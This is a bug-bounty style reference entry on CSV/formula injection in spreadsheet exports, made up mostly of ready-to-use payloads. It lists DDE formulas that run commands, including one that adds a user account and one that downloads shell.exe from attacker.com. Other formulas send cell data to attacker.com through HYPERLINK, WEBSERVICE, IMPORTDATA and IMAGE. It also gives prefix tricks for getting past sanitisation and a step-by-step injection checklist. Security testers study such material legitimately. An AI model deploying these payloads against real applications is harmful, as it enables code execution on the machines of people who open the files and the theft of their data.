---
id: "csv-formula-injection"
title: "CSV / Formula Injection"
type: "technique"
category: "web-application"
subcategory: "injection"
tags: ["csv-injection", "formula-injection", "dde", "excel", "google-sheets", "data-exfiltration"]
platforms: ["linux", "macos", "windows"]
related: ["business-logic-flaws", "xss"]
difficulty: "beginner"
updated: "2026-04-14"
---

# CSV / Formula Injection

## How It Works
User input containing formula characters (=, +, -, @) gets included in exported CSV/Excel files. When opened, the spreadsheet app executes the formula — enabling RCE, data exfiltration, or phishing.

## DDE (Dynamic Data Exchange) Payloads — RCE
```
=cmd|'/C calc.exe'!A0
=cmd|'/C powershell -e BASE64PAYLOAD'!A0
+cmd|'/C net user hacker Password1 /add'!A0
-cmd|'/C certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe'!A0
@SUM(cmd|'/C calc'!A0)
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe'!''
```

## Data Exfiltration Formulas
```
# Excel:
=HYPERLINK("http://attacker.com/steal?data="&A1&B1,"Click here")
=WEBSERVICE("http://attacker.com/steal?data="&A1)
=FILTERXML(WEBSERVICE("http://attacker.com/steal?d="&A1),"//a")

# Google Sheets:
=IMPORTDATA("http://attacker.com/steal?data="&A1)
=IMPORTHTML("http://attacker.com/","table",1)
=IMPORTXML("http://attacker.com/steal?data="&A1,"//a")
=IMAGE("http://attacker.com/steal?data="&A1)
```

## Prefix Bypass Techniques
```
 =cmd|'/C calc'!A0          # Space prefix
	=cmd|'/C calc'!A0         # Tab prefix
;=cmd|'/C calc'!A0          # Semicolon (CSV delimiter)
"=cmd|'/C calc'!A0"         # Quoted in CSV
%0A=cmd|'/C calc'!A0        # Newline injection
```

## Where to Find This
- **Export/download** features ("Export to CSV", "Download as Excel")
- **Admin reports** that include user-generated content
- **Contact forms** → CRM exports
- **Support ticket** systems (Zendesk, Freshdesk CSV exports)
- **Survey/form** builders
- **Billing/invoice** systems with exportable data
- Any field that gets exported: usernames, addresses, comments, notes

## Deep Dig Prompts
```
Given this export feature [describe]:
1. Inject =cmd|'/C calc'!A0 in every user-controllable field
2. Export the data as CSV/Excel
3. Open in Excel with DDE enabled — does calc.exe launch?
4. Test data exfil formulas (HYPERLINK, WEBSERVICE, IMPORTDATA)
5. Try prefix bypasses if input is sanitized
```

## Impact & Bounty Context
- DDE → RCE on admin machine: High ($1k–$5k)
- Data exfiltration via formulas: Medium ($500–$2k)
- Many programs classify as informational — demonstrate real RCE for higher payout
